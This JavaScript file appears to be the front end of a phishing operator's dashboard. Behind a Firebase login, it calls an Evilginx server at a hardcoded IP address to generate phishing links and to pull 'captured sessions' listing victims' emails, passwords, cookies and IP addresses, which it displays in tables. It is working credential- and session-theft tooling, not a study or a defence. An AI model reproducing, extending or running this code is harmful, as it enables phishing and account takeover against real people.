console.log("✅ Script.js loaded successfully");

// Firebase Authentication Check
document.addEventListener("DOMContentLoaded", checkAuthStatus);

function checkAuthStatus() {
    firebase.auth().onAuthStateChanged(user => {
        if (user) {
            console.log("✅ User is logged in:", user.email);
            if (window.location.pathname.includes("index.html")) {
                window.location.href = "dashboard.html"; // Redirect to dashboard if logged in
            }
        } else {
            console.log("❌ User not logged in.");
            if (window.location.pathname.includes("dashboard.html")) {
                window.location.href = "index.html"; // Redirect to login page if not authenticated
            }
        }
    });
}

// Login Function
function login() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    firebase.auth().signInWithEmailAndPassword(email, password)
        .then(userCredential => {
            console.log("✅ Login successful:", userCredential.user.email);
            window.location.href = "dashboard.html"; // Redirect to dashboard
        })
        .catch(error => {
            console.error("❌ Login failed:", error.message);
            alert("Login failed: " + error.message);
        });
}

// Logout Function
function logout() {
    firebase.auth().signOut()
        .then(() => {
            console.log("✅ Logout successful");
            window.location.href = "index.html"; // Redirect to login page
        })
        .catch(error => {
            console.error("❌ Logout failed:", error.message);
        });
}

// Evilginx API Configuration
const evilginx_server = "http://3.149.242.245:5000"; // Update with your domain or public IP

// Generate Phishing Link
function generateLink() {
    fetch(`${evilginx_server}/generate_link`)
        .then(response => response.json())
        .then(data => {
            console.log("✅ Link generated:", data.link);
            document.getElementById("generated-link").innerText = data.link;
        })
        .catch(error => {
            console.error("❌ Error generating link:", error);
            alert("Failed to generate link. Check Evilginx server.");
        });
}

// Fetch Captured Sessions
function fetchCapturedSessions() {
    fetch(`${evilginx_server}/captured_sessions`)
        .then(response => response.json())
        .then(data => {
            console.log("✅ Captured sessions fetched:", data);
            populateCapturedSessionsTable(data);
        })
        .catch(error => {
            console.error("❌ Error fetching captured sessions:", error);
        });
}

// Populate Captured Sessions Table
function populateCapturedSessionsTable(data) {
    let tableBody = document.getElementById("captured-sessions-body");
    tableBody.innerHTML = ""; // Clear previous data

    data.forEach(session => {
        let row = `<tr>
            <td>${session.email}</td>
            <td>${session.password}</td>
            <td>${session.cookies}</td>
            <td>${session.ip}</td>
        </tr>`;
        tableBody.innerHTML += row;
    });
}

// Fetch Generated Links History
function fetchGeneratedLinks() {
    fetch(`${evilginx_server}/generated_links`)
        .then(response => response.json())
        .then(data => {
            console.log("✅ Generated links history fetched:", data);
            populateGeneratedLinksTable(data);
        })
        .catch(error => {
            console.error("❌ Error fetching generated links:", error);
        });
}

// Populate Generated Links History Table
function populateGeneratedLinksTable(data) {
    let tableBody = document.getElementById("generated-links-body");
    tableBody.innerHTML = ""; // Clear previous data

    data.forEach(link => {
        let row = `<tr>
            <td>${link.generated_link}</td>
            <td>${link.location}</td>
            <td>${link.ip}</td>
        </tr>`;
        tableBody.innerHTML += row;
    });
}

// Load Data when Dashboard is Opened
document.addEventListener("DOMContentLoaded", () => {
    if (window.location.pathname.includes("dashboard.html")) {
        fetchCapturedSessions();
        fetchGeneratedLinks();
    }
});
